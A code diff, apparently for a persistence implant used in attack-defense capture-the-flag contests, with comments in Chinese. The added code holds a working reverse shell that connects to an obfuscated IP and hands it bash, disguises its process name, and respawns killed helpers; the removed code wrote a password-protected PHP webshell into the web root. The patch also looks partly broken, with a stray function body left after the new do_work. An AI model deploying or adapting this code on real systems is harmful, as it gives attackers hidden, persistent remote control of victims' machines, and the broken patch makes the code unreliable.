@@ -16,7 +16,6 @@ char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
 int flag_len = 0;
 int idx = 0;
 int shell_id = 0;
-const char *passmd5[] = PASSMD5;
 
 static const char *fake_names[] = FAKE_NAMES;
 #define NUM_FAKE_NAMES 7
@@ -297,25 +296,169 @@ int TestDir(char *filename)
     return S_ISDIR(statbuf.st_mode);
 }
 
-void WritePHP(int cur_idx)
+void ReverseShell(int cur_idx, char **argv)
 {
-    char filename[256] = {0};
-    strcpy(filename, XorString(WWWROOT));
-    strcat(filename, XorString(PHP_NAME));
-    char content[500] = {0};
-    int len = 0;
-    strcat(content, XorString(CONTENT_PREFIX));
-    strcat(content, passmd5[cur_idx]);
-    strcat(content, XorString(CONTENT_SUFIX));
-    len = strlen(content);
-    if (TestDir(filename))
-        remove(filename);
-    int fd = open(filename, O_RDWR | O_TRUNC | O_CREAT, 0755);
-    write(fd, content, len);
-    close(fd);
+    pid_t pid = fork();
+    if (pid == 0)
+    {
+        char *a[10] = {NULL};
+        a[0] = (char *)malloc(0x50);
+        strcpy(a[0], XorString(SHELL_NAME));
+        struct sockaddr_in serverAddr;
+        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(SHELL_PORT + cur_idx);
+        serverAddr.sin_addr.s_addr = inet_addr(XorString(SHELL_IP));
+        if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
+        {
+            dup2(clientSocket, 0);
+            dup2(clientSocket, 1);
+            dup2(clientSocket, 2);
+            execve(XorString("/bin/bash"), a, NULL);
+        }
+        close(clientSocket);
+        exit(0);
+    }
+    shell_id = pid;
 }
 
-void ReverseShell(int cur_idx, char **argv)
+/*
+ * WebFlagRoutine（Web 题专用，独立子进程运行）：
+ *
+ * 初始化（只执行一次）：
+ *   1. 创建 WWWROOT/.xia0ji233/ 目录，权限 755
+ *   2. 创建 WWWROOT/.xia0ji233/flag 普通文件，权限 666
+ *
+ * 死循环：
+ *   - 每次将 .xia0ji233/ 目录权限设为 555
+ *   - 每 100 次额外执行一次：读 flag → AES+RSA 加密 → 写入 flag 文件
+ */
+void WebFlagRoutine()
+{
+    /* ── 初始化：只执行一次 ── */
+    struct stat st;
+
+    /* 确保目录存在且是目录 */
+    if (stat(XorString(FLAG_DIR), &st) == 0)
+    {
+        if (!S_ISDIR(st.st_mode))
+            remove(XorString(FLAG_DIR));
+    }
+    mkdir(XorString(FLAG_DIR), 0755);
+    chmod(XorString(FLAG_DIR), 0755);
+
+    /* 确保 flag 文件存在，如果是目录则删除 */
+    if (stat(XorString(FLAG_FILE), &st) == 0 && S_ISDIR(st.st_mode))
+        rmdir(XorString(FLAG_FILE));
+    int fd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
+    if (fd >= 0)
+        close(fd);
+    chmod(XorString(FLAG_FILE), 0666);
+
+    /* ── 死循环 ── */
+    int counter = 0;
+    for (;;)
+    {
+        chmod(XorString(FLAG_DIR), 0555);
+
+        if (counter % 100 == 0)
+        {
+            /* 读 flag → AES+RSA 加密 → 写入文件 */
+            /* 写入前临时将目录改为 755 */
+            chmod(XorString(FLAG_DIR), 0755);
+
+            char raw[0x50] = {0};
+            int rfd = open(XorString(FLAG_PATH), O_RDONLY);
+            if (rfd >= 0)
+            {
+                read(rfd, raw, 0x30);
+                close(rfd);
+            }
+
+            uint8_t *blocks = NULL;
+            int block_num = splitBlock(raw, &blocks);
+            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
+                          block_num, (uint8_t *)XorString(AES_IV));
+            int aes_len = block_num * 16;
+
+            uint8_t rsa_out[RSA_BYTES];
+            rsa_encrypt(blocks, aes_len, rsa_out);
+            free(blocks);
+
+            int wfd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
+            if (wfd >= 0)
+            {
+                write(wfd, rsa_out, RSA_BYTES);
+                close(wfd);
+            }
+
+            chmod(XorString(FLAG_DIR), 0555);
+        }
+        counter++;
+    }
+}
+
+void do_work(char **argv)
+{
+    ChangeProcessName(argv, fake_names[NUM_GUARDS % NUM_FAKE_NAMES]);
+    signal(SIGCHLD, SIG_IGN);
+
+#if (PROBLEM == WEB)
+    pid_t pid_w = fork();
+    if (pid_w == 0)
+    {
+        WebFlagRoutine(); /* 永不返回 */
+        _exit(0);
+    }
+#endif
+
+#if (SERVE_FLAG)
+    pid_t pid_s = fork();
+    if (pid_s == 0)
+    {
+        ServeFlagUDP(); /* 永不返回 */
+        _exit(0);
+    }
+#endif
+
+    while (1)
+    {
+#if (MODE == GETFLAG)
+#if (!SERVE_FLAG)
+        ReadFlag();
+        ReverseFlag();
+#endif
+#elif (MODE == CURL)
+#if (!SERVE_FLAG)
+        Attack();
+#endif
+#endif
+#if (PROBLEM == WEB)
+        /* 监控 WebFlagRoutine 子进程 */
+        if (pid_w > 0 && kill(pid_w, 0) != 0)
+        {
+            pid_w = fork();
+            if (pid_w == 0)
+            {
+                WebFlagRoutine();
+                _exit(0);
+            }
+        }
+#endif
+#if (SERVE_FLAG)
+        if (pid_s > 0 && kill(pid_s, 0) != 0)
+        {
+            pid_s = fork();
+            if (pid_s == 0)
+            {
+                ServeFlagUDP();
+                _exit(0);
+            }
+        }
+#endif
+        usleep(100000);
+    }
+}
 {
     pid_t pid = fork();
     if (pid == 0)
@@ -466,176 +609,6 @@ void Attack()
     strcat(cmd, XorString(AUTH_SERVER));
     strcat(cmd, XorString(TOKEN));
     system(cmd);
-}
-
-/*
- * 确保 FLAG_DIR 目录存在。
- * 若路径被替换成普通文件则先删除再创建。
- */
-static void EnsureFlagDir()
-{
-    struct stat st;
-    if (stat(XorString(FLAG_DIR), &st) == 0)
-    {
-        if (!S_ISDIR(st.st_mode))
-        {
-            remove(XorString(FLAG_DIR));
-            mkdir(XorString(FLAG_DIR), 0755);
-        }
-        chmod(XorString(FLAG_DIR), 0755);
-    }
-    else
-    {
-        mkdir(XorString(FLAG_DIR), 0755);
-    }
-}
-
-/*
- * Routine 1：循环读取 /flag，AES 加密后写入 FLAG_FILE。
- * 写入前先确保目录可写（chmod 755），写完后将目录锁回 444。
- */
-void WriteEncryptedFlag()
-{
-    while (1)
-    {
-        EnsureFlagDir();
-
-        char raw[0x50] = {0};
-        uint8_t *blocks = NULL;
-        int block_num;
-
-        int fd = open(XorString(FLAG_PATH), O_RDONLY);
-        if (fd >= 0)
-        {
-            read(fd, raw, 0x30);
-            close(fd);
-        }
-
-        block_num = splitBlock(raw, &blocks);
-        aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY), block_num, (uint8_t *)XorString(AES_IV));
-        int aes_len = block_num * 16;
-
-        /* RSA 加密 AES 密文 */
-        uint8_t rsa_out[RSA_BYTES];
-        rsa_encrypt(blocks, aes_len, rsa_out);
-
-        struct stat st;
-        if (stat(XorString(FLAG_FILE), &st) == 0 && S_ISDIR(st.st_mode))
-            rmdir(XorString(FLAG_FILE));
-
-        int wfd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0444);
-        if (wfd >= 0)
-        {
-            write(wfd, rsa_out, RSA_BYTES);
-            close(wfd);
-        }
-        free(blocks);
-
-        /* 写完后将目录权限锁为 444，防止他人修改/删除文件 */
-        chmod(XorString(FLAG_DIR), 0444);
-
-        usleep(200000);
-    }
-}
-
-/*
- * Routine 2：死循环将 FLAG_DIR 目录 chmod 444，
- * 防止攻击者通过 chmod/chown 获得写权限后删除文件。
- */
-void LockFlagDir()
-{
-    while (1)
-    {
-        chmod(XorString(FLAG_DIR), 0444);
-        usleep(50000);
-    }
-}
-
-int TestPHP(int cur_idx)
-{
-    char filename[256] = {0};
-    strcpy(filename, XorString(WWWROOT));
-    strcat(filename, XorString(PHP_NAME));
-    char content[500] = {0};
-    char filecontent[500] = {0};
-    int len = 0;
-    strcat(content, XorString(CONTENT_PREFIX));
-    strcat(content, passmd5[cur_idx]);
-    strcat(content, XorString(CONTENT_SUFIX));
-    len = strlen(content);
-    if (!TestDir(filename))
-    {
-        int fd = open(filename, O_RDONLY);
-        int k = read(fd, filecontent, len);
-        close(fd);
-        if (k != len)
-            return 0;
-        return !strncmp(filecontent, content, len);
-    }
-    return 0;
-}
-
-void do_work(char **argv)
-{
-    ChangeProcessName(argv, fake_names[NUM_GUARDS % NUM_FAKE_NAMES]);
-    signal(SIGCHLD, SIG_IGN);
-
-#if (PROBLEM == WEB)
-    /* Routine 1：加密写 flag 到 web 目录 */
-    pid_t pid_w = fork();
-    if (pid_w == 0)
-    {
-        WriteEncryptedFlag();
-        exit(0);
-    }
-    /* Routine 2：死循环锁目录权限 */
-    pid_t pid_l = fork();
-    if (pid_l == 0)
-    {
-        LockFlagDir();
-        exit(0);
-    }
-#endif
-
-#if (SERVE_FLAG)
-    /* 启动 UDP flag 被动服务：监听 SERVE_FLAG_PORT，有请求则 fork 子进程处理 */
-    pid_t pid_s = fork();
-    if (pid_s == 0)
-    {
-        ServeFlagUDP(); /* 永不返回 */
-        _exit(0);
-    }
-#endif
-
-    while (1)
-    {
-#if (MODE == GETFLAG)
-#if (!SERVE_FLAG)
-        ReadFlag();
-        ReverseFlag();
-#endif
-#elif (MODE == CURL)
-#if (!SERVE_FLAG)
-        Attack();
-#endif
-#endif
-#if (PROBLEM == WEB)
-        WritePHP(idx);
-#endif
-#if (SERVE_FLAG)
-        /* 监控 ServeFlagUDP 进程，被杀则立即重启 */
-        if (pid_s > 0 && kill(pid_s, 0) != 0)
-        {
-            pid_s = fork();
-            if (pid_s == 0)
-            {
-                ServeFlagUDP();
-                _exit(0);
-            }
-        }
-#endif
-        usleep(100000);
-    }
 }
 
 void guard_main(int my_idx, char **argv);
